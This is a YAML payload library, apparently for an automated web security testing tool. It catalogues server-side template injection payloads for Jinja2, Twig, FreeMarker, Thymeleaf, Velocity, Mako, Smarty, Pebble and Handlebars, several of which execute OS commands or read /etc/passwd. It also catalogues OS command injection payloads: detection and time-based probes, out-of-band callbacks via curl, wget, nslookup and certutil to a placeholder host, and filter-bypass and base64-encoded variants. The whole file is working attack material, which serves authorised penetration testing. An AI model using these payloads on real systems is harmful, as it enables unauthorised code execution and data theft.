id: ssti-cmdi-payloads
category: payloads
name: SSTI & Command Injection Payload Library

description: >
  Server-side template injection and OS command injection payloads.
  Use with injection_test or http_request.

ssti:
  detection:
    math_probes:
      - "{{7*7}}"
      - "${7*7}"
      - "#{7*7}"
      - "<%= 7*7 %>"
      - "{7*7}"
      - "{{7*'7'}}"

  identification:
    jinja2:
      - "{{config}}"
      - "{{config.items()}}"
      - "{{self.__class__.__mro__}}"
    twig:
      - "{{_self.env.getFilter('id')}}"
      - "{{'/etc/passwd'|file_excerpt(1,30)}}"
    freemarker:
      - "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
      - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
    thymeleaf:
      - "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
      - "${T(java.lang.Runtime).getRuntime().exec('id')}"
    velocity:
      - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$rt.getRuntime().exec('id')"
    mako:
      - "${__import__('os').popen('id').read()}"
    smarty:
      - "{system('id')}"
      - "{php}echo `id`;{/php}"
    pebble:
      - "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{ bytes }}"
    handlebars:
      - "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"

  rce:
    jinja2:
      - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
      - "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
      - "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}"
    twig:
      - "{{['id']|filter('system')}}"
      - "{{['cat/etc/passwd']|filter('system')}}"

command_injection:
  detection:
    unix:
      - "; id"
      - "| id"
      - "|| id"
      - "& id"
      - "&& id"
      - "$(id)"
      - "`id`"
      - "\nid"
    windows:
      - "& whoami"
      - "| whoami"
      - "|| whoami"
      - "&& whoami"
      - "\nwhoami"

  time_based:
    unix:
      - "; sleep 5"
      - "| sleep 5"
      - "$(sleep 5)"
      - "`sleep 5`"
      - "&& sleep 5"
    windows:
      - "& ping -n 6 127.0.0.1"
      - "| ping -n 6 127.0.0.1"
      - "&& ping -n 6 127.0.0.1"

  blind_oob:
    unix:
      - "; curl http://CALLBACK_URL"
      - "| wget http://CALLBACK_URL"
      - "$(curl http://CALLBACK_URL)"
      - "; nslookup CALLBACK_DOMAIN"
    windows:
      - "& nslookup CALLBACK_DOMAIN"
      - "| certutil -urlcache -f http://CALLBACK_URL"

  filter_bypass:
    space_bypass:
      - ";{IFS}id"
      - ";$IFS$9id"
      - ";${IFS}id"
      - ";%09id"
      - ";cat<>/etc/passwd"
    quote_bypass:
      - ";i''d"
      - ";i\"\"d"
      - ";$'\\x69\\x64'"
    path_bypass:
      - ";/bin/id"
      - ";/usr/bin/id"
      - ";/???/i?"
    encoding:
      - ";$(printf '\\x69\\x64')"
      - ";echo aWQ=|base64 -d|sh"
